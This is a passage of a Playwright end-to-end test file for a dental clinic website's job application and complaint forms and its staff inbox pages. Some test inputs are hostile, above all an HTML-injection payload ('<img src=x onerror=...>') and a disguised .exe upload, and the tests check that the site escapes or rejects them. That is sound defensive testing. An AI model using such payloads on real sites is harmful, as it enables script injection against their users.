    name: r(bar.querySelector('.wordmark')), nav: r(bar.querySelector('nav')), links: [...bar.querySelectorAll('nav a')].map((a) => ({ text: a.textContent, box: r(a) })),
    doors: r(document.querySelector('.door-row')), demo: r(document.querySelector('.hero-demo')),
  };
});
await step('homepage: the top bar links to "Join our team" and "Complaints & suggestions" (on a phone on one line under the name, inside the screen); no buttons under the doors; a section further down says more; the footer links to both', async () => {
  await pf.goto(BASE);
  await pf.locator('.site-header nav a').first().waitFor();
  assert.deepEqual(await barLinks(pf), BAR);
  assert.equal(await pf.locator('.hero-forms').count(), 0, 'no buttons under the doors');
  // The two links do not fit beside the name on a phone: they take their own line under it, side by side, the hit areas
  // inside the screen and 44 px tall, and the page does not scroll sideways.
  for (const [w, ht] of [[390, 844], [360, 740]]) {
    await pf.setViewportSize({ width: w, height: ht });
    const bar = await barLayout(pf);
    assert.ok(bar.nav[1] >= bar.name[3], `at ${w} px the links are under the name, not over it: ${JSON.stringify(bar)}`);
    assert.equal(bar.links[0].box[1], bar.links[1].box[1], `at ${w} px both links are on one line`);
    for (const l of bar.links) assert.ok(l.box[0] >= 0 && l.box[2] <= w && l.box[3] - l.box[1] >= 44, `at ${w} px "${l.text}" is inside the screen and 44 px tall: ${JSON.stringify(l.box)}`);
    assert.ok(await docWidth(pf) <= w, `no sideways scrolling at ${w} px`);
    assert.ok(bar.demo[1] - bar.doors[3] <= 40, `at ${w} px the sample-account line follows the doors: ${JSON.stringify(bar)}`);
    await shot(pf, `39-home-header-${w}`);
  }
  // On a laptop (1366x768) they sit at the top right, beside the name, and the whole hero fits the first screen.
  await pf.setViewportSize({ width: 1366, height: 768 });
  const laptop = await barLayout(pf);
  assert.ok(laptop.nav[0] > laptop.name[2] && laptop.links.every((l) => l.box[1] < laptop.name[3] && l.box[3] > laptop.name[1]), `beside the name: ${JSON.stringify(laptop)}`);
  assert.ok(1366 - laptop.nav[2] <= 64, `at the right: ${JSON.stringify(laptop.nav)}`);
  assert.ok(laptop.demo[3] <= 768 && laptop.demo[1] - laptop.doors[3] <= 40, `the doors and the sample-account line are on the first screen: ${JSON.stringify(laptop)}`);
  await shot(pf, '39b-home-header-1366');
  await pf.setViewportSize({ width: 390, height: 844 });
  const section = pf.locator('#work-with-us');
  await section.scrollIntoViewIfNeeded();
  assert.equal(await section.locator('a.forms-card').count(), 2);
  assert.equal(await section.getByRole('link', { name: /Join our team/ }).getAttribute('href'), '#/join');
  assert.equal(await section.getByRole('link', { name: /Complaints & suggestions/ }).getAttribute('href'), '#/feedback');
  assert.match(await section.locator('.forms-band-note').innerText(), /only to Dr\. Ali Rashid and the clinic's management/);
  assert.equal(await pf.locator('.site-footer a[href="#/join"]').count(), 1, 'footer link to the job form');
  assert.equal(await pf.locator('.site-footer a[href="#/feedback"]').count(), 1, 'footer link to the feedback form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '40-home-forms-390');
  await section.getByRole('link', { name: /Join our team/ }).click();
  await pf.waitForSelector('h1:has-text("Join our team")');
  assert.equal(await pf.title(), "Join our team | Dr. Ali Rashid's Dental Clinic");
  // The form's own top bar on a phone: the same two links on their own line, "Join our team" marked as the page on screen.
  assert.deepEqual(await barLinks(pf), [['Join our team', '#/join', 'page'], BAR[1]]);
  const bar = await pf.locator('.site-header nav a').evaluateAll((as) => as.map((a) => { const b = a.getBoundingClientRect(); return [b.left, b.right]; }));
  assert.ok(bar.every(([l, r]) => l >= 0 && r <= 390), `the links are inside the screen: ${JSON.stringify(bar)}`);
});
await step('join form on a phone: every field has a label; sent empty, each required field says what is missing, focus goes to the first, the error is linked to its field', async () => {
  const form = pf.locator('form.public-form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  for (const label of ['Full name', 'Mobile number', 'Email', 'CNIC number', 'Job you are applying for', 'Degree or qualification', 'Graduation year', 'Experience', 'Preferred branch', 'CV file', 'Message']) {
    assert.equal(await form.getByLabel(new RegExp('^' + label)).count(), 1, 'label: ' + label);
  }
  const yearHint = (await form.getByLabel(/^Graduation year/).getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-hint'));
  assert.equal(await pf.locator('#' + yearHint).innerText(), 'Optional. The year you finished, or expect to finish.');
  // The degree is a list; "Other" opens a box for the degree itself (the word "Other" is never sent).
  assert.deepEqual((await form.getByLabel(/^Degree or qualification/).locator('option').allTextContents()).slice(1), ['BDS', 'BDS + FCPS / MDS', 'Diploma', 'Intermediate', 'Other']);
  assert.equal(await form.getByLabel(/^Your degree or qualification/).isVisible(), false, 'no box for another degree until "Other" is chosen');
  assert.equal(await form.getByLabel(/^Mobile number/).getAttribute('inputmode'), 'tel', 'the phone keyboard for the number');
  assert.equal(await form.getByLabel(/^CNIC number/).getAttribute('inputmode'), 'numeric');
  await form.getByRole('button', { name: 'Send my application' }).click();
  assert.equal(await form.locator('.field-error').count(), 8, 'name, phone, CNIC, job, qualification, branch, CV and consent');
  const name = form.getByLabel(/^Full name/);
  assert.equal(await pf.evaluate(() => document.activeElement?.getAttribute('autocomplete')), 'name', 'focus is on the first field with an error');
  assert.equal(await name.getAttribute('aria-invalid'), 'true');
  const errorId = (await name.getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-error'));
  assert.equal(await pf.locator('#' + errorId).innerText(), 'Please enter your full name.');
  assert.match(await form.innerText(), /Please tick this box, so the clinic may keep your details and contact you\./);
  await shot(pf, '41-join-errors-390');
});
await step('join form: a wrong phone, CNIC, email, CV type, "Other" without the degree and a CV over 5 MB are explained in plain words', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Full name/).fill('Sample Applicant UI');
  await form.getByLabel(/^Mobile number/).fill('021 3456');
  await form.getByLabel(/^CNIC number/).fill('12345-123');
  await form.getByLabel(/^Email/).fill('sample.ui@example.com?subject=hello');
  await form.getByLabel(/^Degree or qualification/).selectOption('Other');
  const otherDegree = form.getByLabel(/^Your degree or qualification/);
  assert.equal(await otherDegree.isVisible(), true, '"Other" opens the box for the degree');
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'cv.exe', mimeType: 'application/x-msdownload', buffer: Buffer.from('MZ') });
  assert.match(await form.innerText(), /Your CV must be a PDF, Word \(\.doc or \.docx\), JPG or PNG file\./, 'said as soon as the file is chosen');
  assert.equal(await form.locator('.form-cv-whatsapp').isVisible(), true, 'a CV the form cannot take: the WhatsApp way is offered');
  await form.getByRole('button', { name: 'Send my application' }).click();
  const text = await form.innerText();
  assert.match(text, /Please enter a Pakistani mobile number, for example 0300 1234567\./);
  assert.match(text, /A CNIC has 13 digits, for example 12345-1234567-1\./);
  assert.match(text, /Please check your email address, for example name@gmail\.com, or leave it empty\./, 'an address with ?subject= is no plain address');
  assert.match(text, /Your CV must be a PDF, Word/);
  assert.equal(await otherDegree.getAttribute('aria-invalid'), 'true', 'the error is on the box for the degree');
  const otherError = (await otherDegree.getAttribute('aria-describedby')).split(' ').find((id) => id.endsWith('-error'));
  assert.equal(await pf.locator('#' + otherError).innerText(), 'Please type your degree or qualification, for example BA or BSc.');
  await shot(pf, '41b-join-other-degree-390');
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'cv.pdf', mimeType: 'application/pdf', buffer: Buffer.alloc(5 * 1024 * 1024 + 1) });
  assert.match(await form.innerText(), /Your CV is larger than 5 MB/);
  // A phone photo of a printed CV over 5 MB (the hint says a photo is fine): a phone cannot make it smaller or turn it into a
  // PDF, so the WhatsApp way is right under the error, as for the busy messages.
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'IMG_0042.jpg', mimeType: 'image/jpeg', buffer: Buffer.alloc(6000000) });
  assert.match(await form.innerText(), /Your CV is larger than 5 MB\. Please choose a smaller file, or a PDF\./);
  const wa = form.locator('.form-cv-whatsapp');
  assert.equal(await wa.isVisible(), true, 'a 6 MB photo: the WhatsApp way is offered');
  assert.match(await wa.getByRole('link', { name: /^Send your CV on WhatsApp/ }).getAttribute('href'), /^https:\/\/wa\.me\/92\d+\?text=.*CV/);
  assert.deepEqual(await form.getByLabel(/^CV file/).evaluate((input) => {
    const next = input.nextElementSibling;
    return [next?.classList.contains('field-error'), next?.nextElementSibling?.classList.contains('form-cv-whatsapp')];
  }), [true, true], 'right under the error');
  await shot(pf, '41c-join-cv-too-large-390');
});
await step('join form: a complete application is sent; the thank-you takes focus and repeats nothing that was typed', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Mobile number/).fill('+92 300 555 7788');
  await form.getByLabel(/^CNIC number/).fill('1234500077881');
  await form.getByLabel(/^CNIC number/).blur();
  assert.equal(await form.getByLabel(/^CNIC number/).inputValue(), '12345-0007788-1', 'the CNIC is shown in its usual shape');
  await form.getByLabel(/^Email/).fill('sample.ui+jobs@example.com');
  await form.getByLabel(/^Job you are applying for/).selectOption({ label: 'Dental hygienist' });
  await form.getByLabel(/^Your degree or qualification/).fill('BSc Dental Hygiene');
  await form.getByLabel(/^Graduation year/).fill('2021');
  await form.getByLabel(/^Preferred branch/).selectOption({ label: 'Gulberg Lahore' });
  await form.getByLabel(/^CV file/).setInputFiles({ name: 'sample-cv.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 made-up CV for the test') });
  assert.equal(await form.locator('.form-cv-whatsapp').isVisible(), false, 'a CV the form takes: no WhatsApp way under it');
  await form.getByLabel(/^Message/).fill('<b>Hello</b> I can start next month.');
  await form.getByLabel(/may keep these details/).check();
  await form.getByRole('button', { name: 'Send my application' }).click();
  await pf.waitForSelector('.form-thanks h1');
  assert.equal(await pf.evaluate(() => document.activeElement?.tagName), 'H1', 'focus moves to the thank-you heading');
  const text = await pf.locator('main').innerText();
  for (const typed of ['Sample Applicant UI', '7788', '12345', 'Hello', 'hygienist']) assert.ok(!text.includes(typed), 'the thank-you does not repeat ' + typed);
  assert.equal(await pf.locator('main form').count(), 0, 'the form is gone');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '42-join-thanks-390');
});
await step('feedback form on a phone: type, topic, branch and message are required; "please contact me" needs a phone number', async () => {
  await pf.goto(BASE + '#/feedback');
  await pf.waitForSelector('h1:has-text("Complaints & suggestions")');
  assert.equal(await pf.title(), "Complaints and suggestions | Dr. Ali Rashid's Dental Clinic");
  const form = pf.locator('form.public-form');
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  assert.equal(await form.locator('.field-error').count(), 4, 'type, topic, branch and message');
  assert.equal(await pf.evaluate(() => document.activeElement?.type), 'radio', 'focus is on the type choice');
  await form.getByRole('radio', { name: /Complaint/ }).check();
  assert.equal(await form.locator('.field-error').count(), 3, 'choosing a type clears its error');
  assert.deepEqual((await form.getByLabel(/^What is it about/).locator('option').allTextContents()).slice(1),
    ['Treatment', 'Doctor', 'Front desk & staff behaviour', 'Waiting time', 'Appointments & timings', 'Clinic cleanliness', 'Fees & billing',
      'Facilities (AC, seating, washroom, parking)', 'Website & online services', 'Other']);
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Waiting time' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'North Nazimabad' });
  await form.getByLabel(/^Message/).fill('Too short');
  await form.getByLabel(/Please contact me/).check();
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  const text = await form.innerText();
  assert.match(text, /Please write a little more \(at least 10 characters\)\./);
  assert.match(text, /Please give your mobile number, so we can contact you about this\./);
  await shot(pf, '43-feedback-errors-390');
});
await step('feedback form: sent with contact details; the thank-you says the clinic will contact them and repeats nothing typed', async () => {
  const form = pf.locator('form.public-form');
  await form.getByLabel(/^Message/).fill('Waited two hours <img src=x onerror="window.__xss=1"> please add more chairs.');
  await form.getByLabel(/^Name/).fill('Sample Visitor UI');
  await form.getByLabel(/^Mobile number/).fill('0301 5557788');
  await form.getByLabel(/^Mr#/).fill('Mr# 9812');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1:has-text("Thank you for telling us")');
  assert.equal(await pf.evaluate(() => document.activeElement?.tagName), 'H1');
  const text = await pf.locator('main').innerText();
  assert.match(text, /will call or message you on the number you gave/);
  for (const typed of ['Sample Visitor UI', '7788', 'chairs', '9812']) assert.ok(!text.includes(typed), 'the thank-you does not repeat ' + typed);
  assert.ok(await docWidth(pf) <= 390, 'no sideways scrolling at 390 px');
  await shot(pf, '44-feedback-thanks-390');
});
await step('feedback form: "Send another message" gives an empty form with focus on its heading, and an anonymous suggestion about no single branch goes through', async () => {
  await pf.getByRole('button', { name: 'Send another message' }).press('Enter');
  await pf.waitForSelector('main form.public-form');
  assert.deepEqual(await pf.evaluate(() => [document.activeElement?.tagName, document.activeElement?.textContent]), ['H1', 'Complaints & suggestions'],
    'focus moves to the heading of the new form (not lost to the page)');
  const form = pf.locator('form.public-form');
  assert.equal(await form.getByLabel(/^Message/).inputValue(), '');
  await form.getByRole('radio', { name: /Suggestion/ }).check();
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Clinic cleanliness' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'Not about one branch' });
  await form.getByLabel(/^Message/).fill('Please keep the waiting area cleaner (sample UI).');
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1');
  assert.match(await pf.locator('main').innerText(), /Messages are read every working day\./);
});
await step('the hidden honeypot box: out of the tab order and hidden from screen readers; a form with it filled is thanked and not stored', async () => {
  await pf.goto(BASE + '#/');
  await pf.waitForSelector('.door');
  await pf.goto(BASE + '#/feedback');
  await pf.waitForSelector('main form.public-form');
  // Its name and id are ones no browser or password manager fills in by itself (not "website", "url" or "homepage").
  const trap = pf.locator('.hp-field input[name="pf_trap"]');
  assert.equal(await trap.getAttribute('tabindex'), '-1');
  assert.equal(await trap.getAttribute('autocomplete'), 'off');
  assert.equal(await trap.getAttribute('aria-hidden'), 'true');
  assert.doesNotMatch(await trap.getAttribute('id'), /web|site|url|home/i);
  assert.equal(await pf.locator('.hp-field').getAttribute('aria-hidden'), 'true');
  assert.equal(await pf.locator('form.public-form input[name="website"], form.public-form input[name="url"]').count(), 0);
  const form = pf.locator('form.public-form');
  await form.getByRole('radio', { name: /Appreciation/ }).check();
  await form.getByLabel(/^What is it about/).selectOption({ label: 'Doctor' });
  await form.getByLabel(/^Branch/).selectOption({ label: 'DHA Karachi' });
  await form.getByLabel(/^Message/).fill('Honeypot sample message from a bot.');
  await trap.evaluate((el) => { el.value = 'http://spam.example'; });
  await form.getByRole('button', { name: 'Send', exact: true }).click();
  await pf.waitForSelector('.form-thanks h1');
});
await step('a full day of applications: the form says "try again tomorrow" in plain words, with a WhatsApp link to send the CV instead', async () => {
  await pf.goto(BASE + '#/join');
  await pf.waitForSelector('main form.public-form');
  // The database's answer once the day's 200 applications are in (FORM_BUSY_DAY), given by the data layer for this one step.
  await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    window.__submitJob = state.data.submitJobApplication;
    state.data.submitJobApplication = async () => { throw new Error('FORM_BUSY_DAY: the clinic has received many job applications today. Please try again tomorrow.'); };
  });
  try {
    const form = pf.locator('form.public-form');
    await form.getByLabel(/^Full name/).fill('Sample Applicant Busy');
    await form.getByLabel(/^Mobile number/).fill('0300 5557799');
    await form.getByLabel(/^CNIC number/).fill('12345-0007799-1');
    await form.getByLabel(/^Job you are applying for/).selectOption({ label: 'Dental assistant' });
    await form.getByLabel(/^Degree or qualification/).selectOption('Diploma');
    await form.getByLabel(/^Preferred branch/).selectOption({ label: 'Any branch' });
    await form.getByLabel(/^CV file/).setInputFiles({ name: 'busy-cv.pdf', mimeType: 'application/pdf', buffer: Buffer.from('%PDF-1.4 made-up CV for the test') });
    await form.getByLabel(/may keep these details/).check();
    await form.getByRole('button', { name: 'Send my application' }).click();
    const alert = form.locator('.form-alert');
    await alert.waitFor();
    assert.match(await alert.innerText(), /^The clinic has received a lot of applications today\. Please try again tomorrow, or send your CV on WhatsApp\./);
    assert.match(await alert.getByRole('link', { name: /Send your CV on WhatsApp/ }).getAttribute('href'), /^https:\/\/wa\.me\/92\d{10}\?text=/, "the clinic's WhatsApp chat");
    assert.equal(await pf.evaluate(() => document.activeElement?.classList.contains('form-alert')), true, 'focus moves to the message');
    assert.equal(await form.locator('.field-error').count(), 0, 'no field is marked wrong');
    assert.equal(await form.getByRole('button', { name: 'Send my application' }).isEnabled(), true, 'the form stays, to send again tomorrow');
    await shot(pf, '44b-join-day-full-390');
  } finally {
    await pf.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.submitJobApplication = window.__submitJob; });
  }
});
await step('staff: Today shows Dr. Ali "New job applications" (2), which opens Job applications filtered to New', async () => {
  await pf.setViewportSize({ width: 1366, height: 860 });
  await loginAs(pf, 'Dr. Ali Rashid');
  const stat = pf.locator('a.stat', { hasText: 'New job applications' });
  await stat.waitFor();
  assert.equal(await stat.locator('strong').innerText(), '2', 'the made-up New application and the one just sent');
  assert.equal(await stat.getAttribute('href'), '#/staff/jobs?status=new');
  await stat.click();
  await pf.waitForSelector('table.jobs-table tbody tr');
  assert.equal(await pf.locator('.jobs-filters select').first().inputValue(), 'new', 'the status filter says New');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 2);
  await pf.goto(BASE + '#/staff/today');
  await pf.waitForSelector('.stat-row');
});
await step('staff: Dr. Ali opens "Job applications" from the More menu: the new application is on top; status, job and branch filters work', async () => {
  await pf.setViewportSize({ width: 1366, height: 860 });
  await pf.locator('.topnav .menu:has-text("More") > button').click();
  await pf.locator('.topnav .menu-list a:has-text("Job applications")').click();
  await pf.waitForSelector('table.jobs-table tbody tr');
  const rows = pf.locator('table.jobs-table tbody tr');
  assert.equal(await rows.count(), 3, 'two made-up applications and the one just sent');
  assert.match(await rows.first().innerText(), /Sample Applicant UI[\s\S]*Dental hygienist[\s\S]*0300 5557788[\s\S]*BSc Dental Hygiene[\s\S]*Gulberg Lahore[\s\S]*New/,
    'the degree typed after choosing "Other" (not the word "Other")');
  const [statusSel, jobSel, branchSel] = [0, 1, 2].map((i) => pf.locator('.jobs-filters select').nth(i));
  await statusSel.selectOption('contacted');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Omar Sample/);
  assert.match(pf.url(), /#\/staff\/jobs\?status=contacted$/, 'the filter is kept in the address');
  await statusSel.selectOption('');
  await jobSel.selectOption('dental_hygienist');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Sample Applicant UI/);
  await jobSel.selectOption('');
  await branchSel.selectOption('any');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 1);
  assert.match(await rows.first().innerText(), /Omar Sample[\s\S]*Any branch/);
  await branchSel.selectOption('');
  await pf.waitForFunction(() => document.querySelectorAll('table.jobs-table tbody tr').length === 3);
  // The made-up CV that was never sent (four days old) is removed by itself (Today or this page, whichever came first): no button to press.
  await pf.waitForFunction(async () => { const { state } = await import('/js/state.js'); return (await state.data.jobCvOrphans()).length === 0; });
  assert.equal(await pf.getByRole('button', { name: 'Remove them' }).count(), 0);
  await shot(pf, '45-staff-jobs');
});
await step('staff: the application dialog shows the CNIC and phone, the message as text, opens the CV through a short link, and saves status and a note with who and when', async () => {
  await pf.getByRole('button', { name: 'Open the application of Sample Applicant UI' }).click();
  const m = pf.locator('.modal');
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /12345-0007788-1/);
  assert.match(text, /0300 5557788/);
  assert.match(text, /<b>Hello<\/b> I can start next month\./, 'the message is shown as typed');
  assert.equal(await m.locator('.job-details b').count(), 0, 'nothing the applicant typed becomes HTML');
  assert.equal(await m.getByRole('link', { name: 'sample.ui+jobs@example.com' }).getAttribute('href'), 'mailto:sample.ui%2Bjobs@example.com',
    'the email link: the address encoded, nothing added');
  const [popup] = await Promise.all([pf.waitForEvent('popup'), m.getByRole('button', { name: /^Open CV \(PDF/ }).click()]);
  await popup.waitForURL(/^blob:/);
  await popup.close();
  await m.getByLabel('Status', { exact: true }).selectOption('interview');
  await m.getByLabel(/^Internal note/).fill('Interview on Saturday (sample).');
  await m.getByRole('button', { name: 'Save' }).click();
  await pf.waitForSelector('.toast:has-text("Saved.")');
  await m.waitFor({ state: 'detached' });
  assert.match(await pf.locator('table.jobs-table tbody tr').first().innerText(), /Interview/);
  await pf.getByRole('button', { name: 'Open the application of Sample Applicant UI' }).click();
  await m.waitFor();
  const history = await m.locator('.job-history').innerText();
  assert.match(history, /Dr\. Ali Rashid[\s\S]*Status changed to Interview/);
  assert.match(history, /Dr\. Ali Rashid[\s\S]*Interview on Saturday \(sample\)\./);
  await shot(pf, '46-staff-job-dialog');
  await pf.keyboard.press('Escape');
  await m.waitFor({ state: 'detached' });
});
await step('staff on a phone: an application opens on its top (job, qualification, mobile), not scrolled down to the Status list', async () => {
  await pf.setViewportSize({ width: 390, height: 664 }); // what a 390x844 phone shows inside the browser
  try {
    for (const name of ['Sana Example', 'Sample Applicant UI']) {
      await pf.getByRole('button', { name: `Open the application of ${name}` }).click();
      const m = pf.locator('.modal');
      await m.waitFor();
      const seen = await m.evaluate((el) => {
        const body = el.querySelector('.modal-body');
        const job = [...el.querySelectorAll('.job-details dt')].find((dt) => dt.textContent === 'Job');
        const b = body.getBoundingClientRect(), j = job.getBoundingClientRect();
        return { scrolls: body.scrollHeight > body.clientHeight, scrollTop: body.scrollTop, jobInView: j.top >= b.top && j.bottom <= b.bottom,
          onTitle: document.activeElement === el.querySelector('h2') };
      });
      assert.deepEqual(seen, { scrolls: true, scrollTop: 0, jobInView: true, onTitle: true }, name);
      if (name === 'Sana Example') await shot(pf, '46b-staff-job-dialog-390x664');
      await pf.keyboard.press('Escape');
      await m.waitFor({ state: 'detached' });
    }
  } finally {
    await pf.setViewportSize({ width: 1366, height: 860 });
  }
});
await step('staff: website forms are in the Complaints inbox marked "Website form" with type, topic, branch and contact details, shown as text, with internal notes only', async () => {
  await pf.goto(BASE + '#/staff/complaints');
  await pf.waitForSelector('table.complaints-table');
  const row = pf.locator('table.complaints-table tbody tr', { hasText: 'Complaint: Waiting time' });
  assert.match(await row.innerText(), /Website form[\s\S]*Sample Visitor UI[\s\S]*0301 5557788[\s\S]*Wants to be contacted[\s\S]*North Nazimabad/);
  assert.match(await pf.locator('table.complaints-table tbody tr', { hasText: 'Suggestion: Clinic cleanliness' }).filter({ hasText: 'sample UI' }).innerText(),
    /Anonymous[\s\S]*Not about one branch/);
  assert.equal(await pf.locator('table.complaints-table tbody tr', { hasText: 'Honeypot sample message' }).count(), 0, 'the honeypot form was not stored');
  await pf.locator('.complaints-from select').selectOption('website');
  const shown = pf.locator('table.complaints-table tbody tr');
  // the list is asked again for the website forms only (the database filters it)
  await pf.waitForFunction(() => document.querySelectorAll('table.complaints-table tbody tr').length === 4);
  assert.equal(await shown.count(), 4, 'two made-up website forms and the two just sent');
  assert.match(pf.url(), /#\/staff\/complaints\?from=website$/, 'the choice is kept in the address');
  assert.equal(await shown.filter({ hasText: 'Website form' }).count(), 4);
  await row.getByRole('button', { name: 'Complaint: Waiting time' }).click();
  const m = pf.locator('.modal');
  await m.waitFor();
  const text = await m.innerText();
  assert.match(text, /Website form Complaint · Waiting time/);
  assert.match(text, /Mr# given: 9812/);
  assert.match(text, /Waited two hours <img src=x onerror="window.__xss=1"> please add more chairs\./, 'the message is shown as typed');
  assert.equal(await m.locator('img').count(), 0, 'no image element from the visitor\'s text');
  assert.equal(await pf.evaluate(() => window.__xss), undefined, 'nothing the visitor typed ran');
  assert.equal(await m.getByText('Internal note (patient does not see it)').count(), 0, 'no reply to a website form: notes only');
  await m.getByLabel(/^Internal note/).fill('Called back, sorry about the wait (sample).');
  await m.getByRole('button', { name: 'Save note' }).click();
  await pf.waitForSelector('.toast:has-text("Saved.")');
  await shot(pf, '47-staff-complaints-website');
});
await step('staff: Dr. Ali deletes a junk website form after a warning; a patient\'s complaint has no Delete', async () => {
  await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.submitFeedback({ kind: 'complaint', topic: 'other', branch: 'none', message: 'Junk sample text for the delete step.', contact_me: false, pf_trap: '' });
  });
  await pf.goto(BASE + '#/staff/today');
  await pf.goto(BASE + '#/staff/complaints?from=website');
  const junk = pf.locator('table.complaints-table tbody tr', { hasText: 'Junk sample text' });
  await junk.waitFor();
  await junk.getByRole('button', { name: 'Complaint: Other' }).click();
  const dlg = pf.locator('.modal', { hasText: 'Junk sample text' });
  await dlg.waitFor();
  await dlg.getByRole('button', { name: 'Delete', exact: true }).click();
  const confirm = pf.locator('.modal', { hasText: 'Delete this website form?' });
  await confirm.waitFor();
  assert.match(await confirm.innerText(), /removed for good, with its notes\. Use this only for junk or spam/);
  await shot(pf, '47b-staff-complaint-delete');
  await confirm.getByRole('button', { name: 'Delete', exact: true }).click();
  await pf.waitForSelector('.toast:has-text("Deleted.")');
  await junk.waitFor({ state: 'detached' });
  assert.equal(await pf.locator('.modal').count(), 0, 'both dialogs are closed');
  assert.equal(await pf.locator('table.complaints-table tbody tr').count(), 4, 'the other website forms stay');
  await pf.locator('.complaints-from select').selectOption('portal');
  await pf.waitForFunction(() => { const rows = [...document.querySelectorAll('table.complaints-table tbody tr')]; return rows.length > 0 && rows.every((r) => !r.textContent.includes('Website form')); });
  await pf.locator('table.complaints-table tbody tr').first().locator('button.link-btn').click();
  const portal = pf.locator('.modal');
  await portal.waitFor();
  assert.equal(await portal.getByRole('button', { name: 'Delete', exact: true }).count(), 0, "a patient's complaint is never deleted");
  await pf.keyboard.press('Escape');
  await portal.waitFor({ state: 'detached' });
});
// A thank-you or a suggestion is not a complaint about a doctor's work: its dialog has no "About which doctor?", and even when linked
// (as the inbox allowed before) it does not count on that doctor's daily log. Today counts everything new under the inbox's full name.
await step('staff: a website thank-you about a doctor has no "About which doctor?" and never counts as a complaint about that doctor', async () => {
  const docId = await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.submitFeedback({ kind: 'appreciation', topic: 'doctor', branch: '1', message: 'Thank you Dr. Bushra for the very gentle treatment (sample UI).', contact_me: false, pf_trap: '' });
    return state.ref.clinicians.find((c) => c.display_name === 'Dr. Bushra (sample)').id;
  });
  await pf.goto(BASE + '#/staff/today');
  await pf.locator('a.stat', { hasText: 'New complaints & suggestions' }).waitFor();
  assert.equal(await pf.locator('table.list th', { hasText: 'New complaints & suggestions' }).count(), 1, 'the branch table says the same');
  await pf.goto(BASE + '#/staff/complaints?from=website');
  const thanks = pf.locator('table.complaints-table tbody tr', { hasText: 'very gentle treatment' });
  await thanks.waitFor();
  await thanks.getByRole('button', { name: 'Appreciation: Doctor' }).click();
  const dlg = pf.locator('.modal', { hasText: 'very gentle treatment' });
  await dlg.waitFor();
  assert.equal(await dlg.locator('select[aria-label="About which doctor"]').count(), 0, 'a thank-you is not linked to a doctor as a complaint');
  await shot(pf, '47c-staff-thanks-no-doctor');
  await pf.keyboard.press('Escape');
  await dlg.waitFor({ state: 'detached' });
  await pf.locator('table.complaints-table tbody tr', { hasText: 'Complaint: Waiting time' }).getByRole('button', { name: 'Complaint: Waiting time' }).click();
  const complaint = pf.locator('.modal', { hasText: 'Complaint · Waiting time' });
  await complaint.waitFor();
  assert.equal(await complaint.locator('select[aria-label="About which doctor"]').count(), 1, 'a website complaint still is');
  await pf.keyboard.press('Escape');
  await complaint.waitFor({ state: 'detached' });
  const counts = await pf.evaluate(async (doc) => {
    const { state } = await import('/js/state.js');
    const count = async () => (await state.data.doctorSummary(doc, '2000-01-01', '2100-12-31')).complaints.length;
    const before = await count();
    const thanksRow = (await state.data.complaints({ from: 'website' })).find((c) => c.body.includes('very gentle treatment'));
    await state.data.linkComplaintDoctor(thanksRow.id, doc);
    return [before, await count()];
  }, docId);
  assert.equal(counts[1], counts[0], 'linked anyway, the thank-you adds nothing to the doctor\'s complaints');
  await pf.goto(BASE + `#/staff/log?doctor=${docId}`);
  await pf.locator('.stat', { hasText: 'Complaints about your work' }).waitFor();
  assert.ok(!(await pf.locator('main').innerText()).includes('Appreciation'), 'the doctor\'s log does not list the thank-you');
});
await step('a role without "Job applications" (the clinic coordinator): no menu entry, "Page not available", and the data layer refuses; website forms still reach their inbox', async () => {
  await tryAnotherRole(pf);
  await loginAs(pf, 'Clinic coordinator');
  await pf.locator('a.stat', { hasText: 'New complaints & suggestions' }).waitFor();
  assert.equal(await pf.locator('a.stat', { hasText: 'New job applications' }).count(), 0, 'Today: no number of job applications');
  await pf.locator('.topnav .menu:has-text("More") > button').click();
  const nav = (await pf.locator('.topnav .menu-list a').allTextContents()).map((t) => t.trim());
  assert.ok(nav.includes('Complaints') && !nav.includes('Job applications'), 'Complaints yes, Job applications no');
  await pf.keyboard.press('Escape');
  await pf.goto(BASE + '#/staff/jobs');
  await pf.waitForSelector('h1:has-text("Page not available")');
  const answer = await pf.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const out = [];
    for (const call of [() => state.data.jobApplications(), () => state.data.jobCvOrphans(), () => state.data.jobCvUrl('incoming/00000000-0000-4000-8000-000000000001.pdf')]) {
      try { await call(); out.push('allowed'); } catch (e) { out.push(/row-level security/.test(e.message) ? 'refused' : e.message); }
    }
    return out;
  });
  assert.deepEqual(answer, ['refused', 'refused', 'refused']);
  await pf.goto(BASE + '#/staff/complaints');
  await pf.waitForSelector('table.complaints-table');
  assert.ok(await pf.locator('table.complaints-table .badge:has-text("Website form")').count() >= 4, 'the coordinator handles the website forms');
  await pf.locator('table.complaints-table tbody tr', { hasText: 'Website form' }).first().locator('button.link-btn').click();
